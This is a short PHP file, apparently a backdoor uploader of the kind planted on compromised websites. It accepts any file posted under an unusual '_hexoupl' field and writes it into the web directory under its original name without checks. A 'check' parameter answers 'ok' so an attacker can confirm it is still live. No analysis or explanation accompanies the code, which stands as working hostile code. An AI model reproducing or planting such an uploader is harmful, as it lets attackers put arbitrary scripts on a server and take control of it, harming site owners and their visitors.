<?php
if($_POST['_hexoupl']=="Upload"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){$vb_6e2baaf3b97dbeef='ok';}else{$vb_6e2baaf3b97dbeef='error';} echo $vb_6e2baaf3b97dbeef;}if(isset($_GET['check'])){echo 'ok';}
?>